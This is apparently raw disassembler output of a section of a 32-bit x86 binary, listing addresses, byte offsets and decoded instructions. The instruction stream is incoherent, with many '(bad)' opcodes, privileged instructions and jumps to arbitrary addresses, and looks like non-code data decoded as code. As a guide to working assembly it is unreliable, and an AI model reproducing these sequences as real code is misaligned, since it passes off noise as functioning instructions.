  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    esi,ebp
  417081:	pusha  
  417082:	add    BYTE PTR es:[ecx+0x50000f3],0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	ds mov ebx,0x24a7ffe3
  417092:	push   cs
  417093:	and    al,0xc
  417095:	scas   al,BYTE PTR es:[edi]
  417096:	push   ecx
  417097:	and    edx,DWORD PTR [esi-0x30a306b]
  41709d:	hlt    
  41709e:	cwde   
  41709f:	mov    eax,ds:0xd07962df
  4170a4:	or     eax,0xf016e43c
  4170a9:	jl     0x417095
  4170ab:	addr16 fsub st,st(6)
  4170ae:	add    DWORD PTR [edi-0x41],edx
  4170b1:	stos   DWORD PTR es:[edi],eax
  4170b2:	jp     0x41707a
  4170b4:	dec    edx
  4170b5:	mov    DWORD PTR ds:0x6468670c,edx
  4170bb:	dec    BYTE PTR [edi+ebx*4+0x37]
  4170bf:	(bad)  
  4170c0:	jbe    0x4170ff
  4170c2:	jle    0x417133
  4170c4:	je     0x41713e
  4170c6:	lds    ecx,FWORD PTR [eax+eiz*1+0x28]
  4170ca:	into   
  4170cb:	jae    0x4170c2
  4170cd:	out    0xf9,eax
  4170cf:	scas   eax,DWORD PTR es:[edi]
  4170d0:	out    dx,al
  4170d1:	xor    BYTE PTR [ecx-0x61],dh
  4170d4:	mov    al,0x2c
  4170d6:	scas   eax,DWORD PTR es:[edi]
  4170d7:	inc    edi
  4170d8:	fisub  DWORD PTR [eax+0x10]
  4170db:	into   
  4170dc:	dec    esp
  4170dd:	add    al,0x87
  4170df:	je     0x4170c7
  4170e1:	ficom  WORD PTR [edi]
  4170e3:	mov    cl,0xc3
  4170e5:	inc    edi
  4170e6:	jmp    0x4170bd
  4170e8:	icebp  
  4170e9:	adc    al,0x6a
  4170eb:	mov    ds:0x7ea3969b,eax
  4170f0:	inc    edx
  4170f1:	jns    0x417084
  4170f3:	mov    cl,0x41
  4170f5:	rcr    DWORD PTR [edx+0x1b],1
  4170f8:	inc    esp
  4170f9:	sti    
  4170fa:	ins    BYTE PTR es:[edi],dx
  4170fb:	cdq    
  4170fc:	rol    BYTE PTR [ebp+0x1d],1
  4170ff:	and    ebp,esp
  417101:	es inc edx
  417103:	cmp    BYTE PTR [eax],ch
  417105:	clc    
  417106:	jecxz  0x41716e
  417108:	aas    
  417109:	xor    BYTE PTR [edi+ecx*1],dh
  41710c:	rsm    
  41710e:	dec    ebx
  41710f:	fstp   DWORD PTR [eax-0x19bfef1b]
  417115:	jb     0x41716c
  417117:	mov    cl,0xe2
  417119:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41711b:	popa   
  41711c:	cld    
  41711d:	xchg   ecx,eax
  41711e:	jp     0x4170bd
  417120:	fs test eax,0x25213115
  417126:	data16 fisttp QWORD PTR [edx+edx*4+0x53732d91]
  41712e:	shl    BYTE PTR [edx-0x18],cl
  417131:	aad    0x7b
  417133:	fs mov ch,0x10
  417136:	pop    ebp
  417137:	stos   DWORD PTR es:[edi],eax
  417138:	ss stos DWORD PTR es:[edi],eax
  41713a:	inc    edx
  41713b:	dec    eax
  41713c:	js     0x4171b0
  41713e:	sbb    ebx,DWORD PTR [ebx+0x34cdf3d6]
  417144:	ja     0x417131
  417146:	push   ss
  417147:	iret   
  417148:	mov    ah,0x70
  41714a:	pop    edx
  41714b:	in     al,0xd7
  41714d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41714e:	add    DWORD PTR [ebx],ecx
  417150:	sub    esi,DWORD PTR [ebx+0x24]
  417153:	mov    WORD PTR [ebp-0xd],?
  417156:	cmp    edx,DWORD PTR [eax]
  417158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417159:	xlat   BYTE PTR ds:[ebx]
  41715a:	and    esp,edx
  41715c:	(bad)  
  41715e:	mov    bh,0x3f
  417160:	mov    ecx,0xea81bf7
  417165:	and    ecx,edi
  417167:	sti    
  417168:	fidiv  DWORD PTR [edi-0x4d383197]
  41716e:	sub    eax,DWORD PTR [ecx]
  417170:	ror    BYTE PTR [ecx+0x31],cl
  417173:	inc    dh
  417175:	push   ebp
  417176:	test   dh,cl
  417178:	jno    0x417187
  41717a:	jnp    0x4171e9
  41717c:	and    ecx,DWORD PTR [ebp-0x3b941a89]
  417182:	xchg   BYTE PTR [ebx-0x1c],bh
  417185:	or     bl,bl
  417187:	jge    0x4171e7
  417189:	in     eax,dx
  41718a:	jbe    0x4171a2
  41718c:	and    DWORD PTR [esi],esi
  41718e:	sahf   
  41718f:	sbb    al,BYTE PTR [esi+0x0]
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	or     DWORD PTR [ebx-0x35],esi
  417203:	fadd   QWORD PTR [esi+0x50000f4]
  417209:	add    DWORD PTR [eax],eax
  41720b:	add    BYTE PTR [edx],dl
  41720d:	jmp    0x4ba99f5c
  417212:	aaa    
  417213:	iret   
  417214:	mov    ebx,0x72da9e80
  417219:	test   BYTE PTR [edx-0x32],0xf4
  41721d:	mov    eax,ds:0x8fe452bf
  417222:	out    dx,al
  417223:	xchg   esi,eax
  417224:	inc    ecx
  417225:	mov    bl,0xe
  417227:	aas    
  417228:	mov    bh,0xb5
  41722a:	inc    edi
  41722b:	push   ds
  41722c:	fdivp  st(0),st
  41722e:	cmp    bl,ah
  417230:	pop    eax
  417231:	pushf  
  417232:	in     eax,dx
  417233:	je     0x4172a7
  417235:	aam    0x6f
  417237:	sub    ax,WORD PTR [esi]
  41723a:	xor    edx,DWORD PTR [eax]
  41723c:	adc    al,ch
  41723e:	jne    0x41724e
  417240:	jecxz  0x41726e
  417242:	into   
  417243:	pop    eax
  417244:	icebp  
  417245:	push   ebp
  417246:	xor    DWORD PTR [ebp-0x18],0xee563aba
  41724d:	(bad)  
  41724e:	enter  0xa574,0xb4
  417252:	mov    eax,0xef1c12
  417257:	mov    ds:0xdb0c3ee6,eax
  41725c:	jp     0x41724b
  41725e:	and    al,0xa2
  417260:	call   0x915c:0xc69fbe6b
  417267:	lock pop edx
  417269:	cmp    DWORD PTR [ebp-0x322e8159],edx
  41726f:	dec    ebx
  417270:	or     DWORD PTR [edx+ecx*2+0x3b679034],edx
  417277:	aaa    
  417278:	xchg   BYTE PTR [eax+eiz*8],ch
  41727b:	into   
  41727c:	jmp    0x4172d7
  41727e:	sbb    DWORD PTR [edx-0x1705a515],ebx
  417284:	mov    esi,0xe1b7f581
  417289:	pop    ebx
  41728a:	jle    0x417306
  41728c:	into   
  41728d:	jp     0x4172b3
  41728f:	inc    edx
  417290:	(bad)  
  417291:	pop    edx
  417292:	scas   eax,DWORD PTR es:[edi]
  417293:	xchg   edx,eax
  417294:	xlat   BYTE PTR ds:[ebx]
  417295:	and    eax,0xe67fb393
  41729a:	cmc    
  41729b:	inc    ecx
  41729c:	pop    esp
  41729d:	mov    ecx,0x1144aa55
  4172a2:	push   ebp
  4172a3:	mov    cl,0xf8
  4172a5:	inc    esp
  4172a6:	in     al,dx
  4172a7:	fbld   TBYTE PTR [ecx-0x2c759dec]
  4172ad:	cmp    bl,BYTE PTR ds:0x71738e7c
  4172b3:	and    eax,0x136c790d
  4172b8:	xchg   edx,eax
  4172b9:	and    esi,ebx
  4172bb:	jecxz  0x4172d8
  4172bd:	jns    0x417318
  4172bf:	nop
  4172c0:	call   0x8b8b:0x99bde565
  4172c7:	leave  
  4172c8:	inc    edx
  4172c9:	push   ebx
  4172ca:	sbb    DWORD PTR [eax],ebp
  4172cc:	inc    ecx
  4172cd:	xchg   BYTE PTR [edx],dh
  4172cf:	out    dx,al
  4172d0:	adc    ah,BYTE PTR [ebp-0x16de14ac]
  4172d6:	dec    edx
  4172d7:	and    DWORD PTR [ecx],ebx
  4172d9:	jae    0x4172cc
  4172db:	xlat   BYTE PTR ds:[ebx]
  4172dc:	aad    0x3e
  4172de:	fnstsw WORD PTR [eax+eax*1-0x1c3f136f]
  4172e5:	inc    edx
  4172e6:	push   0x92bcba38
  4172eb:	and    dh,dl
  4172ed:	xchg   edi,eax
  4172ee:	mov    al,ds:0xe435ac3e
  4172f3:	cmp    ebx,esi
  4172f5:	jge    0x4172db
  4172f7:	rcr    DWORD PTR [edx-0x3f],cl
  4172fa:	xchg   ecx,ebp
  4172fc:	push   cs
  4172fd:	or     ecx,DWORD PTR [ebp-0xd07cc11]
  417303:	fsubr  QWORD PTR [esi+0x61]
  417306:	dec    esp
  417307:	xchg   ebx,eax
  417308:	push   esp
  417309:	or     ah,al
  41730b:	stos   BYTE PTR es:[edi],al
  41730c:	push   0xffffffe5
  41730e:	mov    WORD PTR [ebx+0x10],ss
	...
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	gs pushf 
  417381:	lds    esi,FWORD PTR [eax+0x6c]
  417384:	mov    esi,ebp
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0x6d000001
  41738d:	or     eax,0x8a13c60b
  417392:	pop    edx
  417393:	xchg   esp,eax
  417394:	adc    al,0xb
  417396:	add    DWORD PTR [ebp+0x77147782],ecx
  41739c:	inc    ecx
  41739d:	push   ecx
  41739e:	loope  0x41733a
  4173a0:	fst    DWORD PTR [edi+edx*8+0x1d]
  4173a4:	aam    0x2a
  4173a6:	sti    
  4173a7:	dec    ebp
  4173a8:	dec    esi
  4173a9:	sub    eax,0x56c2d30b
  4173ae:	jl     0x417388
  4173b0:	push   esp
  4173b1:	jge    0x41741f
  4173b3:	pop    edi
  4173b4:	and    eax,0x6812f15b
  4173b9:	dec    esi
  4173ba:	aaa    
  4173bb:	fchs   
  4173bd:	sbb    al,0x7c
  4173bf:	cmp    al,0x78
  4173c1:	ret    0xb651
  4173c4:	icebp  
  4173c5:	fistp  QWORD PTR [ebp+0x75]
  4173c8:	adc    esp,edi
  4173ca:	ja     0x41737d
  4173cc:	(bad)  
  4173cd:	pop    edx
  4173ce:	fwait
  4173cf:	aas    
  4173d0:	ins    DWORD PTR es:[edi],dx
  4173d1:	call   0x21440069
  4173d6:	fidiv  DWORD PTR [eax-0x7b]
  4173d9:	xor    dl,BYTE PTR [esi+0x5e2ac6bc]
  4173df:	pushf  
  4173e0:	push   ebx
  4173e1:	push   ebp
  4173e2:	pop    eax
  4173e3:	inc    edx
  4173e4:	fdiv   QWORD PTR [edx]
  4173e6:	mov    ch,0xa8
  4173e8:	sub    al,0xac
  4173ea:	shl    dh,cl
  4173ec:	pop    ss
  4173ed:	repz test eax,0xc3324962
  4173f3:	pop    edx
  4173f4:	mov    ?,ebp
  4173f6:	int3   
  4173f7:	jmp    0x41737e
  4173f9:	mov    ds:0x141ea0d,al
  4173fe:	inc    esi
  4173ff:	test   esi,0x6501a8c
  417405:	and    ch,BYTE PTR [edx+0x1db36149]
  41740b:	push   edx
  41740c:	rcr    DWORD PTR [eax],1
  41740e:	leave  
  41740f:	jmp    0xab03c2bd
  417414:	lds    ebx,FWORD PTR [edx]
  417416:	clc    
  417417:	stc    
  417418:	clc    
  417419:	fmul   DWORD PTR [eax-0x4b]
  41741c:	cmp    al,BYTE PTR [edi+0xf]
  41741f:	cmp    eax,0xdf842167
  417424:	cdq    
  417425:	out    dx,eax
  417426:	arpl   sp,ax
  417428:	mov    cl,0x4c
  41742a:	call   0x151f:0x3d332cf7
  417431:	retf   
  417432:	sbb    al,0x9b
  417434:	cdq    
  417435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417436:	fstp   DWORD PTR [ecx-0x25]
  417439:	jge    0x41742f
  41743b:	out    dx,eax
  41743c:	mul    BYTE PTR [ecx]
  41743e:	data16 fcmovbe st,st(0)
  417441:	dec    ecx
  417442:	or     al,0x73
  417444:	dec    ebx
  417445:	dec    ebp
  417446:	int3   
  417447:	sub    eax,0xba565ed0
  41744c:	jp     0x4174b8
  41744e:	mov    ebx,0xea551950
  417453:	push   ds
  417454:	das    
  417455:	jmp    0x63dc2a3b
  41745a:	stos   DWORD PTR es:[edi],eax
  41745b:	mov    ds:0xb6b51306,al
  417460:	pop    ebx
  417461:	inc    eax
  417462:	sar    BYTE PTR [edx],0xcb
  417465:	mov    ds:0xad66ab51,eax
  41746a:	jecxz  0x417471
  41746c:	sub    edi,DWORD PTR [ecx-0x2b]
  41746f:	pop    eax
  417470:	add    ah,0x19
  417473:	stos   BYTE PTR es:[edi],al
  417474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417475:	(bad)  
  417476:	pop    ebx
  417477:	shr    dh,cl
  417479:	xor    al,BYTE PTR [edx]
  41747b:	ja     0x417466
  41747d:	jns    0x41742b
  41747f:	or     BYTE PTR [ebx-0x44547e6],dh
  417485:	cmp    dh,BYTE PTR [ebx+0x1ee3bbc2]
  41748b:	setg   BYTE PTR [eax+0x8cefce]
	...
  4174f2:	add    BYTE PTR [eax],al
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	push   edx
  417501:	sbb    BYTE PTR [edi-0x79],bh
  417504:	nop
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0xb5000001
  41750d:	cmp    BYTE PTR [eax+ebp*1-0x46ab21b6],ah
  417514:	fdivr  DWORD PTR [ebx-0x59]
  417517:	xor    eax,ebp
  417519:	fwait
  41751a:	icebp  
  41751b:	scas   al,BYTE PTR es:[edi]
  41751c:	shl    dl,1
  41751e:	jbe    0x41756a
  417520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417521:	cmp    al,0x15
  417523:	into   
  417524:	in     eax,0x1b
  417526:	push   ecx
  417527:	mov    cl,BYTE PTR [esi+0x2276d8d0]
  41752d:	call   0x2724:0x74720e05
  417534:	xchg   edx,eax
  417535:	iret   
  417536:	pop    ecx
  417537:	test   al,0xeb
  417539:	in     eax,dx
  41753a:	imul   ebx,ecx,0x5888c1bb
  417540:	test   BYTE PTR [edi-0x4e84e19d],bh
  417546:	adc    ecx,eax
  417548:	mov    ah,0x8a
  41754a:	sub    BYTE PTR [eax-0x298e0c3e],al
  417550:	add    eax,0x8f65130f
  417555:	out    0x21,eax
  417557:	cs enter 0x2d1,0x67
  41755c:	jecxz  0x4174fb
  41755e:	cmp    DWORD PTR [esi+esi*2+0x65f015],0xffffffa8
  417566:	data16 int 0x46
  417569:	ror    ebp,1
  41756b:	xchg   esi,eax
  41756c:	mov    eax,ds:0x31f14053
  417571:	ins    DWORD PTR es:[edi],dx
  417572:	in     al,dx
  417573:	mov    ebx,0x59a3df44
  417578:	sbb    DWORD PTR [ebx],ecx
  41757a:	mov    ch,dl
  41757c:	xchg   edi,eax
  41757d:	mov    esp,0x85112e5d
  417582:	adc    al,0xa9
  417584:	(bad)  
  417586:	repnz lock popf 
  417589:	adc    DWORD PTR [ebp+0x69b06469],0xffffff8e
  417590:	adc    al,0xc9
  417592:	mov    eax,0x5509dc41
  417597:	dec    ecx
  417598:	mov    bl,0xfa
  41759a:	sub    DWORD PTR [ebp-0x4],ebx
  41759d:	and    eax,0xe4c8e846
  4175a2:	sbb    BYTE PTR [edi-0x129f1b52],bl
  4175a8:	or     dh,bl
  4175aa:	and    cl,cl
  4175ac:	jmp    0x4175b8
  4175ae:	fbstp  TBYTE PTR [ecx-0x57]
  4175b1:	loope  0x4175e3
  4175b3:	dec    ecx
  4175b4:	idiv   BYTE PTR [edx]
  4175b6:	sbb    DWORD PTR [ecx+0x60],esp
  4175b9:	pop    es
  4175ba:	(bad)  
  4175bb:	dec    ecx
  4175bc:	mov    bh,0x7
  4175be:	xchg   DWORD PTR [edx],edx
  4175c0:	cmp    DWORD PTR [esi+0x1a861551],esp
  4175c6:	aaa    
  4175c7:	and    dl,BYTE PTR [edi]
  4175c9:	jmp    0xd075:0x9e2a5173
  4175d0:	retf   
  4175d1:	ror    DWORD PTR [eax+0x32],cl
  4175d4:	mov    WORD PTR ds:0xd4d24282,ds
  4175da:	and    edx,DWORD PTR [ecx+eiz*4+0x229d784d]
  4175e1:	jae    0x41765b
  4175e3:	lods   eax,DWORD PTR ds:[esi]
  4175e4:	leave  
  4175e5:	xor    DWORD PTR [eax],0xffffff99
  4175e8:	ja     0x41764a
  4175ea:	inc    esp
  4175eb:	lea    eax,[edx+ebp*2-0xa]
  4175ef:	sbb    edi,DWORD PTR [edx+0x78]
  4175f2:	or     BYTE PTR [ecx+edx*8],bh
  4175f5:	mov    eax,0x333586f6
  4175fa:	pop    esi
  4175fb:	push   0xffffffc8
  4175fd:	cmc    
  4175fe:	pop    eax
  4175ff:	xchg   dl,ch
  417601:	js     0x4175a9
  417603:	add    dh,BYTE PTR [ebp-0xf90db90]
  417609:	fucomp st(2)
  41760b:	and    BYTE PTR [edx+eax*2],dl
  41760e:	fdiv   st,st(6)
  417610:	mov    es,WORD PTR [eax]
	...
  417672:	add    BYTE PTR [eax],al
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fidiv  DWORD PTR [ecx-0xe]
  417682:	adc    eax,0xf7953f
  417687:	add    BYTE PTR ds:0x30000001,al
  41768d:	fild   WORD PTR [ebp+0x6c6f57b6]
  417693:	retf   
  417694:	rol    bl,cl
  417696:	into   
  417697:	(bad)  
  417699:	call   0x562bc376
  41769e:	cmc    
  41769f:	push   ebx
  4176a0:	inc    edi
  4176a1:	adc    cl,BYTE PTR [eax+0x2f]
  4176a4:	xchg   ecx,eax
  4176a5:	inc    eax
  4176a6:	mov    ch,0xd3
  4176a8:	inc    esi
  4176a9:	or     dh,BYTE PTR [edx]
  4176ab:	stc    
  4176ac:	loop   0x417680
  4176ae:	sub    al,BYTE PTR [eax-0x59]
  4176b1:	dec    edx
  4176b2:	xor    al,0xd2
  4176b4:	js     0x4176d0
  4176b6:	rcl    cl,1
  4176b8:	inc    ecx
  4176b9:	or     DWORD PTR [esi+0x67],edx
  4176bc:	test   al,0xa3
  4176be:	jmp    0x38918324
  4176c3:	arpl   WORD PTR [edx-0x2dd10808],sp
  4176c9:	outs   dx,DWORD PTR ds:[esi]
  4176ca:	test   BYTE PTR [ecx-0x6f],ch
  4176cd:	repnz fstp DWORD PTR [ebp-0x7]
  4176d1:	call   0x807c76f8
  4176d6:	pop    ds
  4176d7:	and    DWORD PTR [ecx+0x51],0x6f11cae6
  4176de:	fwait
  4176df:	dec    ebx
  4176e0:	add    edi,DWORD PTR [esi]
  4176e2:	gs inc ecx
  4176e4:	ins    DWORD PTR es:[edi],dx
  4176e5:	je     0x4176f6
  4176e7:	sbb    eax,0x86a1af2e
  4176ec:	mov    esi,0x36db6265
  4176f1:	xchg   esp,eax
  4176f2:	xor    BYTE PTR [ecx+0x71c1a4ac],cl
  4176f8:	jg     0x417768
  4176fa:	jno    0x4176b5
  4176fc:	mov    ds,WORD PTR [eax+ebp*8+0x5a]
  417700:	loope  0x417686
  417702:	stos   BYTE PTR es:[edi],al
  417703:	sub    esp,esi
  417705:	sti    
  417706:	test   DWORD PTR [ebx],edx
  417708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417709:	dec    eax
  41770a:	fst    DWORD PTR [edx-0x79afbe22]
  417710:	pop    eax
  417711:	cmp    DWORD PTR [ebx+ecx*2-0x64c359e9],eax
  417718:	faddp  st(4),st
  41771a:	into   
  41771b:	inc    esi
  41771c:	fsubr  DWORD PTR [esi-0x5d664b93]
  417722:	mul    edx
  417724:	sahf   
  417725:	or     BYTE PTR gs:[ebx+0x15],dh
  417729:	pop    ecx
  41772a:	mov    cl,0x83
  41772c:	popa   
  41772d:	into   
  41772e:	mov    ss,edi
  417730:	xchg   esp,eax
  417731:	sar    dl,0x69
  417734:	popf   
  417735:	(bad)  
  417736:	mov    al,ds:0x35db127e
  41773b:	mov    bl,0xf2
  41773d:	mov    bh,0xb8
  41773f:	(bad)  
  417740:	jnp    0x417792
  417742:	add    BYTE PTR [edi],ch
  417744:	sub    eax,0x6323bae4
  417749:	mov    ch,0x5a
  41774b:	push   esi
  41774c:	popf   
  41774d:	mov    DWORD PTR [edx+0x7844d6cb],ebx
  417753:	mov    dl,0x8b
  417755:	sbb    al,0xdb
  417757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417758:	mov    ds:0x15775458,eax
  41775d:	std    
  41775e:	and    BYTE PTR [edx+0x6159b41a],0x42
  417765:	pop    ebx
  417766:	mov    esi,0xae768d0
  41776b:	int3   
  41776c:	xchg   DWORD PTR [ebx-0x5],esp
  41776f:	not    DWORD PTR [esp+edi*2-0x708b3f0f]
  417776:	jmp    0xba3fcd3c
  41777b:	jp     0x4177c9
  41777d:	jb     0x417730
  41777f:	sbb    eax,0xcefda54e
  417784:	je     0x417799
  417786:	sbb    al,0xa8
  417789:	lea    eax,[edi-0x42]
  41778c:	mov    al,ds:0x7d94d020
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	shl    BYTE PTR [esi+0x17],cl
  417802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417804:	call   0x1:0x50000f8
  41780b:	add    BYTE PTR [edi+eax*2],cl
  41780e:	xor    eax,ebp
  417810:	ret    0x5b34
  417813:	stc    
  417814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417815:	sbb    ah,BYTE PTR [ebp+0x542b9694]
  41781b:	jp     0x41781e
  41781d:	add    BYTE PTR [edi],0x1
  417820:	cmp    BYTE PTR [edx+0x13],dl
  417823:	test   BYTE PTR [ebp+0x1921829e],ch
  417829:	jl     0x4177d1
  41782b:	(bad)  
  41782d:	mov    edi,0x1926a164
  417832:	push   ebx
  417833:	lock add BYTE PTR [esi-0x2dacc4fc],ah
  41783a:	mov    eax,ds:0x6b2ca8e9
  41783f:	pop    ecx
  417840:	mov    al,ds:0x818d8776
  417845:	leave  
  417846:	daa    
  417847:	xchg   esp,eax
  417848:	inc    ecx
  417849:	into   
  41784a:	jb     0x4178c4
  41784c:	ret    
  41784d:	arpl   WORD PTR [edi],dx
  41784f:	stos   BYTE PTR es:[edi],al
  417850:	call   0x566d4cef
  417855:	sbb    al,0xbc
  417857:	in     eax,dx
  417858:	mov    edi,0x8615285e
  41785d:	cmp    eax,0x41ec03c6
  417862:	pop    ebx
  417863:	retf   0xcfb7
  417866:	scas   eax,DWORD PTR es:[edi]
  417867:	or     eax,0xef7778dc
  41786c:	inc    edx
  41786d:	xor    eax,0xb4c00aad
  417872:	lods   al,BYTE PTR ds:[esi]
  417873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417874:	cmc    
  417875:	cmp    ecx,DWORD PTR [edx+eax*4-0x10]
  417879:	xchg   ecx,eax
  41787a:	or     al,0x79
  41787c:	mov    edx,0xd08cdb25
  417881:	inc    esp
  417882:	and    al,0x12
  417884:	leave  
  417885:	rol    DWORD PTR [edx+0x6ee80904],1
  41788b:	mov    edi,0xf8fda089
  417890:	xchg   esp,eax
  417891:	sbb    ebp,DWORD PTR [edi-0x205cb00c]
  417897:	push   ebx
  417898:	aam    0x5a
  41789a:	pop    ds
  41789b:	cwde   
  41789c:	jbe    0x41790a
  41789e:	jne    0x4178b4
  4178a0:	(bad)  [edx+eiz*1-0x232923b4]
  4178a7:	jle    0x41782b
  4178a9:	leave  
  4178aa:	lods   eax,DWORD PTR ds:[esi]
  4178ab:	xchg   ecx,eax
  4178ac:	pop    eax
  4178ad:	pop    ecx
  4178ae:	scas   al,BYTE PTR es:[edi]
  4178af:	sahf   
  4178b0:	jmp    0x7cd9:0xa2844a3c
  4178b7:	jo     0x417844
  4178b9:	push   0x58
  4178bb:	aam    0x85
  4178bd:	cwde   
  4178be:	inc    edx
  4178bf:	adc    DWORD PTR [ebp-0x47],ebp
  4178c2:	es js  0x41788f
  4178c5:	jbe    0x41789b
  4178c7:	add    BYTE PTR [eax-0x712b8a17],bh
  4178cd:	call   0x6bd3884c
  4178d2:	and    BYTE PTR [ebx],dh
  4178d4:	or     ebx,DWORD PTR [esi]
  4178d6:	out    0x53,al
  4178d8:	stos   BYTE PTR es:[edi],al
  4178d9:	fstp   TBYTE PTR [ebp-0x59a54c6e]
  4178df:	xor    bl,ah
  4178e1:	and    DWORD PTR [ebx+edx*2],ebx
  4178e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178e5:	repnz mov edx,0x152baa42
  4178eb:	in     eax,0xfb
  4178ed:	pusha  
  4178ee:	cli    
  4178ef:	sti    
  4178f0:	fs inc eax
  4178f2:	gs cmc 
  4178f4:	xchg   ebp,eax
  4178f5:	call   0x6a6ed2f9
  4178fa:	imul   esp,edi,0xfffffff9
  4178fd:	test   DWORD PTR [edi],0xcc43dd05
  417903:	or     BYTE PTR [esi],0x86
  417906:	sbb    al,0x64
  417908:	cmp    eax,ebx
  41790a:	lahf   
  41790b:	cmp    BYTE PTR [edx-0x7fdcde83],cl
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	fld    DWORD PTR [esi]
  417982:	(bad)  
  417983:	cdq    
  417984:	lahf   
  417985:	stc    
  417986:	add    BYTE PTR [eax],al
  417988:	add    eax,0xbe000001
  41798d:	(bad)  
  41798e:	or     BYTE PTR [ebx+eiz*1],al
  417991:	cdq    
  417992:	or     esi,DWORD PTR [edx]
  417994:	inc    ecx
  417995:	jns    0x417918
  417997:	push   ebx
  417998:	loopne 0x417966
  41799a:	push   ds
  41799b:	hlt    
  41799c:	pop    edi
  41799d:	test   DWORD PTR [edi+0xc4605a7],0xc95629fa
  4179a7:	int    0x19
  4179a9:	jmp    0x6b25:0x5eed0374
  4179b0:	mov    ch,0x8
  4179b2:	mov    eax,0xd0e3ee66
  4179b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179b8:	fisub  DWORD PTR [esi-0x42eadfd7]
  4179be:	sbb    bh,BYTE PTR [ebp-0x75f7f96]
  4179c4:	sub    ch,BYTE PTR [ecx]
  4179c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179c7:	daa    
  4179c8:	mov    esp,0x5035e1c6
  4179cd:	sahf   
  4179ce:	test   DWORD PTR [ebx+ecx*2-0x6536179b],ecx
  4179d5:	dec    edi
  4179d6:	aad    0x23
  4179d8:	mov    eax,0x7a43771d
  4179dd:	mov    ds,WORD PTR [edx-0x5b]
  4179e0:	das    
  4179e1:	je     0x417a20
  4179e3:	jle    0x417a24
  4179e5:	mov    dh,0xf5
  4179e7:	in     al,0xe2
  4179e9:	jb     0x417a16
  4179eb:	sar    dl,1
  4179ed:	and    ah,BYTE PTR [ebx-0x3b97cd60]
  4179f3:	call   0x7e08cf29
  4179f8:	mov    esp,DWORD PTR [eax-0x6e]
  4179fb:	js     0x417a36
  4179fd:	xchg   sp,dx
  417a00:	aas    
  417a01:	fcmovu st,st(6)
  417a03:	ja     0x417a53
  417a05:	aas    
  417a06:	push   esi
  417a07:	lahf   
  417a08:	(bad)  
  417a09:	ins    BYTE PTR es:[edi],dx
  417a0a:	cmp    al,0x86
  417a0c:	ror    BYTE PTR [ebx],1
  417a0e:	xor    eax,0x3e24adbe
  417a13:	sub    BYTE PTR [edi],bh
  417a15:	sub    DWORD PTR [edx+0x1e],0x66cde24a
  417a1c:	dec    ebp
  417a1d:	ret    
  417a1e:	scas   eax,DWORD PTR es:[edi]
  417a1f:	aam    0xf
  417a21:	sub    esi,0xf3e01e6c
  417a27:	cmp    al,BYTE PTR [eax-0x6c973fa5]
  417a2d:	out    0xa,eax
  417a2f:	mov    bh,0x2e
  417a31:	pop    es
  417a32:	inc    ebx
  417a33:	icebp  
  417a34:	test   BYTE PTR [edx],al
  417a36:	fwait
  417a37:	(bad)  
  417a38:	mov    gs,esp
  417a3a:	sub    al,0x95
  417a3c:	retf   0xcf11
  417a3f:	jecxz  0x417a12
  417a41:	xchg   ecx,eax
  417a42:	clc    
  417a43:	jbe    0x4179c8
  417a45:	ret    0xd2e1
  417a48:	sub    ah,ch
  417a4a:	jb     0x417a33
  417a4c:	inc    edi
  417a4d:	mov    esi,fs
  417a4f:	ds nop
  417a51:	jg     0x417a99
  417a53:	iret   
  417a54:	aam    0x9
  417a56:	inc    ebp
  417a57:	ins    DWORD PTR es:[edi],dx
  417a58:	mov    db0,ebx
  417a5b:	sub    BYTE PTR [ecx-0x412da308],ah
  417a61:	mov    bh,0x90
  417a63:	push   0xfffffff0
  417a65:	cmp    BYTE PTR [ebx-0x1577abb6],cl
  417a6b:	cli    
  417a6c:	xchg   esp,eax
  417a6d:	pop    ss
  417a6e:	sbb    BYTE PTR [eax+0x7d],ch
  417a71:	rol    BYTE PTR [edx],1
  417a73:	repz jmp 0x5c7b647a
  417a79:	dec    ebp
  417a7a:	mov    ebp,0x90ddfb3e
  417a7f:	xchg   edx,eax
  417a80:	cmc    
  417a81:	pop    ss
  417a82:	jecxz  0x417a92
  417a84:	scas   eax,DWORD PTR es:[edi]
  417a85:	dec    esi
  417a86:	sub    ebx,DWORD PTR [eiz*4-0x43f5fa7e]
